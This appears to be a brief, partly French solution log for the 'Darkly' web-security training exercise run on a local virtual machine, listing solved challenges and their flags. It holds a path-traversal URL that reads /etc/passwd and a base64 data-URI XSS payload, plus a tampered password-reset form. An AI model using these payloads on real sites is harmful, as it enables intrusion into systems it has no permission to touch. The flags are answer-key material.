# darkly

Open your web browser <br>

```c
Faire une redirection de port

Network Advanced 
Host ip: 127.0.0.1
Host port: 8080
Guest ip : 10.0.2.15
Gest Port 80

```

```c
1.✅
Forget Password
button submit , j'ai mit envoyer a mon adresse 
The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0

2.✅
Le site est mal sécurisé car le code PHP ne vérifie pas ce que tu demandes dans l'URL.
http://localhost:8080/index.php?page=../../../../../../../etc/passwd
The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 

3.✅

http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4=
The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

Quand j'accede a cette page :
http://localhost:8080/index.php?page=media&src=...
le site decode la valeur de src.

on dit au navigateur du code base64
data:text/html;base64
on a encoder un alert() qui declenche un script cachet.

```


4.❌
```c



```
















https://github.com/ChokMania/Darkly/blob/master/10-XSS_Reflected_Cross-site_Scripting/Ressources/explications.md




```
